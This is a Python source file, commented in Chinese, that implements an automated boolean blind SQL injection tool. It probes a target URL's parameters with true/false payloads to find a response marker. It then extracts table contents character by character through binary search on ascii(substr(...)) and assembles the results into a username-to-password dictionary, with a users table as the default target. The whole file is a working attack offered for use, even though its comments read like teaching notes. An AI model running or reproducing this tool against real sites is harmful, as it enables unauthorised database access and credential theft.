"""
名词说明：
    prefix   闭合原 SQL 语句引号部分的注入前缀，如 -1'
    suffix   注释原查询剩余部分的注释符，如 " -- "（MySQL 中 -- 后必须跟一个空格）
    op       连接词 AND / OR：原条件为真用 AND，为假用 OR
    keyword  判断标志：页面"有数据"时才出现的一段文字
"""

import html
import logging
import re
import threading

from urllib.parse import parse_qs, quote, urlsplit

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
}


class SQLInjection:

    def __init__(self, url, body_type="form", method="get", headers=None, prefix="-1'", suffix=" -- ",
                 table_name="users", columns=None, keyword=None, op="OR",
                 params_name=None, timeout=10, max_length=250, extra_params=None):
        # 构造阶段：校验参数，并提前算好列名拼接片段
        # body_type 决定 POST 请求体格式：form（默认）或 json；也兼容标准 Content-Type 写法
        _body = str(body_type).strip().lower()
        if _body in ("json", "application/json"):
            self.body_type = "json"
        elif _body in ("form", "application/x-www-form-urlencoded"):
            self.body_type = "form"
        else:
            raise ValueError(f"body_type 只能是 'form' 或 'json'，当前收到：{body_type}")

        self.logger = logging.getLogger(__name__)

        self.url = url
        self.method = method
        self.headers = headers or DEFAULT_HEADERS
        self.prefix = prefix
        self.suffix = suffix
        self.timeout = timeout
        self.max_length = max_length
        self.table_name = table_name

        if extra_params is None:
            self.extra_params = {}
        elif isinstance(extra_params, dict):   # 内置函数 isinstance()：判断 extra_params 是否为字典
            self.extra_params = dict(extra_params)   # 内置函数 dict()：复制字典，避免外部后续修改影响本对象
        else:
            raise ValueError(
                f"extra_params 必须是字典，例如 {{'submit':'submit','login':'login'}},当前收到：{extra_params!r}"
            )

        self.op = str(op).strip().upper()   # 内置函数 str()：把 op 转成字符串，避免传数字时 .strip() 报错
        if self.op not in ("AND", "OR"):
            raise ValueError(f"op 只能是 AND 或 OR，当前收到：{op}")

        if columns is None:
            raise ValueError("columns 不能为空，至少需要一个列名，例如 columns=['username']")
        if isinstance(columns, str):   # 内置函数 isinstance()：区分"单个列名"和"列名列表"
            columns = [columns]
        if not columns:
            raise ValueError("columns 不能为空，至少需要一个列名")
        if any(not str(c).strip() for c in columns):   # 内置函数 any()：任意一个列名为空就报错
            raise ValueError(f"columns 中存在空列名：{columns}")
        self.columns = [str(c).strip() for c in columns]   # 内置函数 str()：列名统一转成字符串

        self.params_name = params_name
        self.target_param = None
        self.keyword = keyword
        self.concat_target = self._build_concat_target()

        self.local = threading.local()

        self.is_prefix()

    def log_info(self, msg):
        self.logger.info(msg)

    def log_warning(self, msg):
        self.logger.warning(msg)

    def log_error(self, msg):
        self.logger.error(msg)

    def is_prefix(self):
        # 按 prefix 首字符猜测原条件真假：负号开头多为假，配合 OR 才有一真一假
        pre = str(self.prefix).strip()   # 内置函数 str()：prefix 统一转字符串，再判断首字符
        baseline_false = pre.startswith("-")
        if baseline_false and self.op == "AND":
            self.log_warning(
                f"prefix={self.prefix} 以负号开头，原查询条件为假，op 建议用 OR（现在是 AND）。"
                f"搭配错了的话真假响应会一模一样，一个字符都猜不出来。 -- > "
            )
        elif not baseline_false and self.op == "OR":
            self.log_warning(
                f"prefix={self.prefix} 不以负号开头，原查询条件可能为真，op 建议用 AND（现在是 OR）。"
                f"这只是字面猜测，如果 detect_keyword() 能找到判断标志就说明搭配没问题，可忽略本提示。"
            )

    def _build_concat_target(self):
        # 多列用 concat_ws(0x3a, 列1, 列2) 拼成 "值1:值2"，单列直接用列名
        if len(self.columns) > 1:   # 内置函数 len()：统计列数，决定用单列还是 concat_ws 拼接
            return f"concat_ws(0x3a,{','.join(self.columns)})"
        return self.columns[0]

    def get_params_name(self):
        # 优先用手动传入的 params_name，否则从 URL 的查询串里解析
        if self.params_name:
            if isinstance(self.params_name, str):   # 内置函数 isinstance()：判断传的是单个参数名还是列表
                return [self.params_name]
            return list(self.params_name)   # 内置函数 list()：把元组/列表统一转成列表

        qs = parse_qs(urlsplit(self.url).query, keep_blank_values=True)
        if qs:
            all_params = list(qs.keys())   # 内置函数 list()：取 URL 中的全部参数名
            self.log_info(f"从 URL 解析到参数：{all_params}")
            return all_params

        self.log_error(f"{self.url} 里没有查询参数，无法自动确定注入点，请手动传 params_name，例如 params_name='id'")
        raise ValueError("URL 没有查询参数，请手动传入 params_name")

    def _resolve_param(self):
        # 若探测阶段已确认某个参数有注入点，就直接复用它
        if self.target_param:
            return self.target_param
        names = self.get_params_name()
        self.target_param = names[0]
        if len(names) > 1:   # 内置函数 len()：判断 URL 中是否不止一个参数
            self.log_warning(f"URL 里有多个参数 {names}，默认只用第一个 {self.target_param}；"
                             f"想指定别的请在构造时传 params_name='xxx'")
        return self.target_param

    @property
    def session(self):
        # 每个线程各持有一个 Session，复用 TCP 连接；盲注请求量大，复用能明显提速
        s = getattr(self.local, "session", None)   # 内置函数 getattr()：取线程本地 session，不存在时返回 None 而不报错
        if s is None:
            s = requests.Session()
            s.trust_env = False
            s.headers.update(self.headers)
            self.local.session = s
        return s

    def _get(self, param, payload):
        # 按 method 选 GET/POST；POST 再由 body_type 决定 json 还是 form
        method = self.method.upper()
        params = self.extra_params.copy()
        params[param] = payload
        if method == "GET":
            return self.session.get(self.url, params=params, timeout=self.timeout)
        elif method == "POST":
            if self.body_type == "json":
                return self.session.post(self.url, json=params, timeout=self.timeout)
            else:
                return self.session.post(self.url, data=params, timeout=self.timeout)
        else:
            raise ValueError(f"不支持的 HTTP 方法：{method}")

    def close(self):
        s = getattr(self.local, "session", None)
        if s is not None:
            s.close()
            self.local.session = None

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # with 退出时自动关闭 Session；返回 False 表示不吞异常
        self.close()
        return False

    @staticmethod
    def _visible_lines(doc: str):
        # 先删 script/style，再把标签换成换行，最后去掉空行和首尾空格
        text = re.sub(r"(?is)<(script|style)\b.*?</\1>", "\n", doc)
        text = re.sub(r"<[^>]+>", "\n", text)
        return [p.strip() for p in text.splitlines() if p.strip()]
        # 等价写法：
        # result = []
        # for p in text.splitlines():
        #     stripped = p.strip()
        #     if stripped:
        #         result.append(stripped)
        # return result

    @staticmethod
    def reflects(line, *payload):
        # payload 可能以原文、HTML 实体、URL 编码三种形态回显，任意一种命中就算回显
        plain = html.unescape(line)
        return any(p in line or p in plain or quote(p, safe="") in line for p in payload)   # 内置函数 any()：三种回显形态任意一种命中即返回 True
        # 等价写法：
        # for p in payload:
        #     if p in line:
        #         return True
        #     if p in plain:
        #         return True
        #     if quote(p, safe="") in line:
        #         return True
        # return False

    def ordinary_request(self):
        # 真/假各请求两次：两次真都有、两次假都没有的行，才算稳定地判断标志
        true_payload = f"{self.prefix} {self.op} 1=1{self.suffix}"
        false_payload = f"{self.prefix} {self.op} 1=2{self.suffix}"

        for param in self.get_params_name():
            self.log_info(f"正在测试参数：{param}")
            try:
                t1 = self._get(param, true_payload)
                f1 = self._get(param, false_payload)

                if t1.status_code != f1.status_code:
                    self.log_warning(f"真假响应状态码不同：{t1.status_code} vs {f1.status_code}，"
                                     f"可能是报错型注入，布尔盲注未必适用")

                if t1.text == f1.text:
                    self.log_warning(f"参数 {param}：真假两次响应完全相同，"
                                     f"说明这个参数没有注入点，或被 WAF 拦截，或 prefix/op 搭配不对")
                    continue

                t2 = self._get(param, true_payload)
                f2 = self._get(param, false_payload)
            except requests.RequestException as ex:
                self.log_error(f"请求失败：{ex}")
                return None

            true_lines = self._visible_lines(t1.text)
            true_lines_again = set(self._visible_lines(t2.text))   # 内置函数 set()：把行列表转成集合，后续 O(1) 判断某行是否存在
            false_lines = set(self._visible_lines(f1.text)) | set(self._visible_lines(f2.text))   # 内置函数 set()：两次假页面的行合并成集合，便于排除

            for line in true_lines:
                if len(line) < 6:   # 内置函数 len()：过短的行（如 "1"）容易误判，直接跳过
                    continue
                if self.reflects(line, true_payload, false_payload):
                    continue
                if line in true_lines_again and line not in false_lines:
                    self.target_param = param
                    self.log_info(f"[+] 参数 {param} 存在布尔盲注，判断标志：{line}")
                    return line

            self.log_warning(f"参数 {param}：没找到稳定且有区分度的判断标志")

        self.log_error("所有参数都试过了，没找到判断标志。可以自己在构造时传 keyword='页面里的某段文字'")
        return None

    def detect_keyword(self):
        # 自动探测判断标志，成功后写回 self.keyword
        result = self.ordinary_request()
        if result:
            self.log_info(f"--> 已找到判断标志：{result}")
            self.keyword = result
            return result
        self.log_error("--> 没能自动找到判断标志，请手动传入 keyword 参数")
        return None

    def blind_sql(self):
        # 逐位二分：ascii(substr(...)) > mid，真则往大找，假则记下 mid 往小找
        if not self.keyword:
            self.log_error("还没有判断标志（keyword），请先调用 detect_keyword()，或构造时手动传 keyword")
            return None

        param = self._resolve_param()
        inner_query = f"select group_concat({self.concat_target}) from {self.table_name}"

        result = ""
        for pos in range(1,self.max_length + 1):   # 内置函数 range()：生成 1 ~ max_length 的字符位置序号
            lo = 0
            hi = 127
            found_ascii = -1
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = (f"{self.prefix} {self.op} "
                           f"ascii(substr(({inner_query}),{pos},1))> {mid}"
                           f"{self.suffix}")
                try:
                    resp = self._get(param, payload)
                except requests.RequestException as ex:
                    self.log_error(f"第 {pos} 位试字符,二分mid:{mid}请求异常，跳过：{ex}")
                    found_ascii = 0
                    break

                if self.keyword in resp.text:
                    lo = mid + 1
                else:
                    found_ascii = mid
                    hi = mid - 1
            if found_ascii <= 0:
                self.log_info(f"第{pos}位无效字符")
                break
            char = chr(found_ascii)   # 内置函数 chr()：把 ASCII 码转回字符
            result += char

            self.log_info(f"第 {pos} 位 = {mid}  -> 当前结果{result}")

        user_dict = {}
        records = result.split(",")
        for record in records:
            if ":" in record:
                data = record.split(":")
                if len(data) == 2:   # 内置函数 len()：只有拆成两段才是"用户名:密码"
                    username = data[0].strip()
                    password = data[1].strip()
                    user_dict[username] = password
            else:
                user_dict[record.strip()] = ""

        if user_dict:
            return user_dict

        return {}
